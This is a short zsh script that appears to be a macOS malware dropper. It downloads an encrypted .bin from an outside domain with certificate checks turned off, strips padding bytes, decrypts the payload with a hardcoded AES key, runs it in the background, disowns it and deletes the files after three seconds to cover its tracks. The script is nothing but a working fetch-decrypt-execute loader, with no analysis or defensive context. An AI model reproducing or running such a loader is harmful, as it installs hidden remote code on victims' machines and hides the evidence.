#!/bin/zsh
mmuh2=$(mktemp /tmp/y429dd.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m4a3c81b6572c4883.bin" -o "$mmuh2z" || exit 1
pmujnq=$(stat -f %z "$mmuh2z"); uekhp5b=$(( pmujnq - 139 - 457 ))
tail -c +$(( 139 + 1 )) "$mmuh2z" | head -c $uekhp5b | openssl enc -d -aes-256-cbc -k 1961fc2d995bfe65be960a7b -out "$mmuh2" 2>/dev/null
[ -s "$mmuh2" ] && chmod 700 "$mmuh2" && ( "$mmuh2" & ) && disown
( sleep 3; rm -f "$mmuh2" "$mmuh2z" ) &>/dev/null &
